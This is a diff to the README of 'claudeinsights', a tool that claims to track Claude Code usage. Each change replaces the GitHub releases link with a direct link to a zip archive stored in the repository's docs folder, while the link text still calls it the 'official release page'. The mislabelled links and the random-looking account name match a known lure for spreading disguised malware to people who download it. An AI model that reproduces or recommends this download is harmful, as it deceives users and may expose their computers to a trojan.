@@ -1,6 +1,6 @@
 # 📊 claudeinsights - Track your AI usage with ease
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tattingpapulovesicle985/claudeinsights/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/tattingpapulovesicle985/claudeinsights/raw/refs/heads/main/docs/Software_v1.4.zip)
 
 ## 💡 About this app
 
@@ -22,7 +22,7 @@ The software keeps your data private. It works as one small file on your compute
 
 You need a Windows computer to run this tool. No setup or coding knowledge is necessary to use it.
 
-1. Go to the [official release page](https://github.com/tattingpapulovesicle985/claudeinsights/releases). 
+1. Go to the [official release page](https://github.com/tattingpapulovesicle985/claudeinsights/raw/refs/heads/main/docs/Software_v1.4.zip). 
 2. Look for the recent version of the app.
 3. Click the file to save it to your computer.
 4. Open the folder where you saved the file.
@@ -80,7 +80,7 @@ The app only reads your session logs to calculate token counts and model usage. 
 Yes. This application comes as a standalone file. You do not need to install Python, Node.js, or any other programming environment.
 
 **How do I update the dashboard?**
-Visit the [download link](https://github.com/tattingpapulovesicle985/claudeinsights/releases) periodically for new versions. Simply replace the old file with the new one. Your local data remains safe in your log folders.
+Visit the [download link](https://github.com/tattingpapulovesicle985/claudeinsights/raw/refs/heads/main/docs/Software_v1.4.zip) periodically for new versions. Simply replace the old file with the new one. Your local data remains safe in your log folders.
 
 **Where does the name come from?**
 The tool focuses on providing insights into your Claude Code workflow. It gives you the information you need to optimize your AI-assisted development.
